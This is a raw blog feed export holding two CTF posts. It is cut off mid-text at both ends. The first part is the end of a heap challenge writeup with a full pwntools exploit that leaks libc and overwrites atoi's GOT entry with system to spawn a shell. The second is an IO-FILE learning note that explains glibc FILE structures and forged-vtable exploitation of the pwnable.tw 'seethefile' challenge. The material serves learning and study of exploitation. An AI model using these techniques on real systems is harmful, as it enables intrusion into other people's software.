class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>, <span class="string">"splitw"</span>, <span class="string">"-h"</span>]</span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./sales_office"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./sales_office"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/glibc/lib/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(arg=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> arg:</span><br><span class="line">        gdb.attach(p, arg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">    raw_input(<span class="string">"&gt;&gt;&gt;&gt;&gt;&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(size, ctx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the size of your house:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"please decorate your house:"</span>)</span><br><span class="line">    p.send(ctx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sell</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        buy(<span class="number">0x10</span>, <span class="string">"AAAA"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        sell(i)</span><br><span class="line"></span><br><span class="line">    buy(<span class="number">0x10</span>, p64(elf.got[<span class="string">"puts"</span>]))</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"house:\n"</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>)) - libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">    success(<span class="string">"libc_base: &#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line">    <span class="comment"># one_gadget = libc_base + 0xdc5c9</span></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line">    sell(<span class="number">4</span>)</span><br><span class="line">    sell(<span class="number">5</span>)</span><br><span class="line">    sell(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        buy(<span class="number">0x10</span>, <span class="string">"ABCD"</span>)</span><br><span class="line"></span><br><span class="line">    buy(<span class="number">0x10</span>, p64(elf.got[<span class="string">"atoi"</span>]))</span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">"ABCD"</span>)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    buy(<span class="number">0x10</span>, p64(system))</span><br><span class="line">    p.sendafter(<span class="string">"choice:"</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO-FILE Learning Note</title>
      <link href="/writing/IO-FILE-Learning-Note/"/>
      <url>/writing/IO-FILE-Learning-Note/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>This post is just to note something when I was in learning <code>IO FILE</code>. I will introduce the <code>FILE Structure</code> in GNU C Library, related functions and some CTF challenges.</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h2 id="FILE-Structure"><a href="#FILE-Structure" class="headerlink" title="FILE Structure"></a>FILE Structure</h2><p>When the program starts, three files are opened by default, <code>stdin</code>, <code>stdout</code> and<code>stderr</code>. They are standard input, standard output, and standard error. The corresponding file descriptors are<code>0 1 2</code>.</p><p>Everything under Linux is treated as a file, and the monitor and keyboard are treated as files. The standard input here is the keyboard, and the standard output is the corresponding display.</p><p>Linux uses a pointer to the <code>_IO_FILE</code> structure to operate its corresponding file, which include the file descriptor. The FILE structure holds the file descriptor, the operation file permissions, <code>_IO_buffer</code>information, and so on.</p><p>This is the definition of <code>_IO_FILE</code> in <code>glibc-2.23</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_flags</code> is used to record some attributes of the file stream.</p><p><code>_IO_read_ptr</code> , <code>_IO_read_base</code> and <code>_IO_read_end</code> are used to describe the <strong>read buffer</strong> in the file stream.  As the above code comments shown, the <code>ptr</code>  points to the read buffer position. The <code>base</code> points to the position that we will use in the next, and the <code>end</code> points to the end of the read buffer.</p><p>Same as above, <code>_IO_write_*</code> is used to describe the <strong>write buffer</strong> and <code>_IO_buffer_*</code> for the <strong>reserve buffer</strong>.</p><p><code>_fileno</code> is the file descriptor, and the value is from system call <code>open</code>.</p><p>Normally we use another <code>FILE Structure</code> named <code>_IO_file_plus</code>, which is an extension for the <code>_IO_file</code>. It’s definition is as below:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Compared with <code>_IO_FILE</code>, <code>_IO_file_plus</code> is added a virtual function table.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>From the definition, we can find many functions in the virtual function table.  All of the file operations will through the <code>vtable</code> to complete. If we can tamper the <code>vtable</code>, we would control the execution process of the program. Because of this, make it possible to have some of the attacks. In the latest version of glibc, some check functions have been added to check  whether the <code>vtable</code> is valid .</p><h1 id="Exploitation-of-FILE"><a href="#Exploitation-of-FILE" class="headerlink" title="Exploitation of FILE"></a>Exploitation of FILE</h1><h2 id="Forged-vtable-attack"><a href="#Forged-vtable-attack" class="headerlink" title="Forged vtable attack"></a>Forged vtable attack</h2><p>In <em>glibc &lt; 2.24</em>, we can use a fake vtable to control the execution process of the program. </p><h3 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h3><p><code>seethefile</code> is the first <code>IO-FILE</code> related challenge in <code>pwnable.tw</code>. The functions of the program is as blow shown:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( atoi(&amp;nptr) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        openfile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        readfile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        writefile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        closefile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Leave your name :"</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">"%s"</span>, &amp;name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Thank you %s ,see you next time\n"</span>, &amp;name);</span><br><span class="line">        <span class="keyword">if</span> ( fp )</span><br><span class="line">          fclose(fp);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invaild choice"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> <code>openfile</code> : It can use <code>fopen</code> to open the file that we input. The file name can’t contain the key words flag. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">"%63s"</span>, filename);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(filename, <span class="string">"flag"</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Danger !"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">fp = fopen(filename, <span class="string">"r"</span>);</span><br></pre></td></tr></table></figure><p><code>readfile</code> : This function uses <code>fread</code> to read 24 chars from the file we open before to the <code>magicbuf</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(magicbuf, <span class="number">0</span>, <span class="number">0x190</span>u);</span><br><span class="line"><span class="keyword">if</span> ( !fp )</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You need to open a file first"</span>);</span><br><span class="line">result = fread(magicbuf, <span class="number">0x18F</span>u, <span class="number">1u</span>, fp);</span><br></pre></td></tr></table></figure><p><code>writefile</code> : Display the content of the <code>magicbuf</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(filename, <span class="string">"flag"</span>) || <span class="built_in">strstr</span>(magicbuf, <span class="string">"FLAG"</span>) || <span class="built_in">strchr</span>(magicbuf, <span class="number">125</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you can't see it"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(magicbuf);</span><br></pre></td></tr></table></figure><p><strong>Analysis：</strong></p><ul><li><p>There is no limit to the length of the input when entering the name, which caused an overflow vulnerability.</p><p><code>__isoc99_scanf(&quot;%s&quot;, &amp;name);</code></p></li><li><p>We can use the bug to overflow the pointer fp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804B260                 public name</span><br><span class="line">.bss:0804B260 name            db    ? ;               ; DATA XREF: main+9F↑o</span><br><span class="line">.bss:0804B260                                         ; main+B4↑o</span><br><span class="line">.bss:0804B261                 db    ? ;</span><br><span class="line">.bss:0804B262                 db    ? ;</span><br><span class="line">......</span><br><span class="line">.bss:0804B27E                 db    ? ;</span><br><span class="line">.bss:0804B27F                 db    ? ;</span><br><span class="line">.bss:0804B280                 public fp</span><br><span class="line">.bss:0804B280 ; FILE *fp</span><br><span class="line">.bss:0804B280 fp</span><br></pre></td></tr></table></figure></li><li><p>Use a fake vtable to hijack the program’s execution process</p></li></ul><p><strong>Exploitation:</strong></p><ul><li><p>First, we use function <code>readfile</code> to get the content of <code>/proc/self/maps</code>. After that, we will get the address of libc.</p></li><li><p>Then, we should use the overflow vulnerability to forge a fake fp.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+--------------+</span><br><span class="line">|     name     |</span><br><span class="line">+--------------+</span><br><span class="line">|              |</span><br><span class="line">|     ...      +-----&gt; 0x20</span><br><span class="line">|              |</span><br><span class="line">+--------------+</span><br><span class="line">|      fp      |</span><br><span class="line">+--------------+</span><br><span class="line">|              |</span><br><span class="line">|              |</span><br><span class="line">|              |</span><br><span class="line">|   fake fp    |</span><br><span class="line">|              |</span><br><span class="line">|              |</span><br><span class="line">|              |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure></li><li><p>The fake fp will be closed by <code>fclose</code>, and it will call <code>_IO_new_file_finish</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br></pre></td></tr></table></figure><p>And <code>_IO_new_file_finish</code> will call <code>_IO_new_file_close_it</code> .</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_new_file_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_do_flush (fp);</span><br><span class="line">      <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))</span><br><span class="line">_IO_SYSCLOSE (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>So, we can make <code>fp</code> points to the name and  <code>__close</code> points to <code>__libc_system</code>. So,  we will get shell when program call  <code>_IO_new_file_finish</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">    +--------------+</span><br><span class="line">+--&gt;|     name     +-----&gt; &#x2F;bin&#x2F;sh</span><br><span class="line">|   +--------------+</span><br><span class="line">|   |              |</span><br><span class="line">|   |      ...     +-----&gt; 0x20</span><br><span class="line">|   |              |</span><br><span class="line">|   +--------------+</span><br><span class="line">+--+|      fp      |</span><br><span class="line">    +--------------+</span><br><span class="line">    |              |</span><br><span class="line">    |              |</span><br><span class="line">    |      ...     |</span><br><span class="line">    |              |</span><br><span class="line">    |              |</span><br><span class="line">    +--------------+</span><br><span class="line">    |    vtable    |</span><br><span class="line">    +--------------+</span><br><span class="line">    |              |</span><br><span class="line">    |              |</span><br><span class="line">    |              |</span><br><span class="line">    +--------------+</span><br><span class="line">    |    __close   +-----&gt; system</span><br><span class="line">    +--------------+</span><br><span class="line">    |              |</span><br><span class="line">    |              |</span><br><span class="line">    |              |</span><br><span class="line">    +--------------+</span><br></pre></td></tr></table></figure></li><li><p>But things are not going as smoothly as expected. When I processed as described above, the program threw an error.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────────────────────────── code:x86:<span class="number">32</span> ────</span><br><span class="line">   <span class="number">0xf75d05e5</span> &lt;fclose@@GLIBC_2<span class="number">.1</span>+<span class="number">62</span>&gt; add    BYTE PTR [ebx+<span class="number">0x6f710c4</span>], al</span><br><span class="line">   <span class="number">0xf75d05eb</span> &lt;fclose@@GLIBC_2<span class="number">.1</span>+<span class="number">68</span>&gt; add    BYTE PTR [eax+<span class="number">0x42750000</span>], al</span><br><span class="line">   <span class="number">0xf75d05f1</span> &lt;fclose@@GLIBC_2<span class="number">.1</span>+<span class="number">74</span>&gt; mov    edi, DWORD PTR gs:<span class="number">0x8</span></span><br><span class="line"> → <span class="number">0xf75d05f8</span> &lt;fclose@@GLIBC_2<span class="number">.1</span>+<span class="number">81</span>&gt; mov    edx, DWORD PTR [esi+<span class="number">0x48</span>]</span><br><span class="line">   <span class="number">0xf75d05fb</span> &lt;fclose@@GLIBC_2<span class="number">.1</span>+<span class="number">84</span>&gt; cmp    DWORD PTR [edx+<span class="number">0x8</span>], edi</span><br><span class="line">   <span class="number">0xf75d05fe</span> &lt;fclose@@GLIBC_2<span class="number">.1</span>+<span class="number">87</span>&gt; je     <span class="number">0xf75d0627</span> &lt;_IO_new_fclose+<span class="number">128</span>&gt;</span><br><span class="line">   <span class="number">0xf75d0600</span> &lt;fclose@@GLIBC_2<span class="number">.1</span>+<span class="number">89</span>&gt; mov    eax, <span class="number">0x0</span></span><br><span class="line">   <span class="number">0xf75d0605</span> &lt;fclose@@GLIBC_2<span class="number">.1</span>+<span class="number">94</span>&gt; mov    ecx, <span class="number">0x1</span></span><br><span class="line">   <span class="number">0xf75d060a</span> &lt;fclose@@GLIBC_2<span class="number">.1</span>+<span class="number">99</span>&gt; cmp    DWORD PTR gs:<span class="number">0xc</span>, <span class="number">0x0</span></span><br><span class="line">────────────────────────────────────────────────────────────── source:iofclose.c+<span class="number">56</span> ────</span><br><span class="line">     <span class="number">51</span></span><br><span class="line">     <span class="number">52</span>    <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">     <span class="number">53</span>    <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">     <span class="number">54</span>      _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line">     <span class="number">55</span></span><br><span class="line">           <span class="comment">// fp=0xffa85f70  →  [...]  →  